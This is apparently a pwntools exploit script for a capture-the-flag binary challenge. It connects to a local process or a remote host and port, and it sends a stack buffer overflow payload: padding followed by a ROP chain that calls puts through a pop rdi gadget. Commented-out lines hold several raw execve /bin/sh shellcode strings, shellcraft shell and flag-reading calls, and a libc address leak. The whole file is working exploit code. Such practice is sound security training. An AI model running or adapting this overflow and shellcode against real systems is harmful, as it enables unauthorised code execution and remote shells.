import sys
import logging
from pwn import *
logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)

if len(sys.argv) == 2:
    program_name = sys.argv[1]
    target = process(program_name)
    logging.info("***local exploit ***")

else:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    logging.info("***remote exploit ***")
    logging.info("[*]target host : " + HOST)
    logging.info("[*]target port : " + str(PORT))
    target = remote(HOST, PORT)

###address###
puts_plt = 0x400580
scanf_plt = 0x4005c0

pop_rdi_ret = 0x00000000004007e3
pop_rsi_r15 = 0x00000000004007e1 
pop_rbp_ret = 0x0000000000400638
leave_ret = 0x0000000000400706

ret_addr = 0x0000000000400566 

bss_writable = 0x600c00

call_rax = 0x0000000000400560

format_st = 0x40081b
welcome_st = 0x400804

#shellcode = b'\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05'
#shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
#shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
#shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
#shellcode = b"\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#shellcode = b"\x48\x31\xc0\x48\x31\xd2\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x51\x48\x89\xe7\xb9\x2e\x2f\x00\x00\x51\x48\x89\xe6\x50\x56\x57\x48\x89\xe6\xb8\x3b\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\x0f\x05\x66\x2e\x0f\x1f\x84\x00\x00\x00\x00\x00\x0f\x1f\x40\x00"
#
#context(arch='amd64')
#shellcode = asm(shellcraft.amd64.linux.sh())
#shellcode = asm(shellcraft.amd64.linux.cat("flag.txt"))


###main###
def main():
    ###payload###
    payload = b"A" * 40
    payload += p64(ret_addr)
    payload += p64(pop_rdi_ret)
    payload += p64(welcome_st)
    payload += p64(puts_plt)
    payload += b"C" * 8

    print(payload)
    print(target.recvline())
    target.sendline(payload)
    
    #print(shellcode)

    #target.sendline(p64(bss_writable + 0x310) + shellcode)
    
    print(target.recvline())
    #puts_libc_addr = u64(target.recv(6) + b"\x00\x00")
    #print("[*] puts libc addr = 0x{:x}".format(puts_libc_addr))

    #target.interactive()


if __name__ == "__main__":
    main()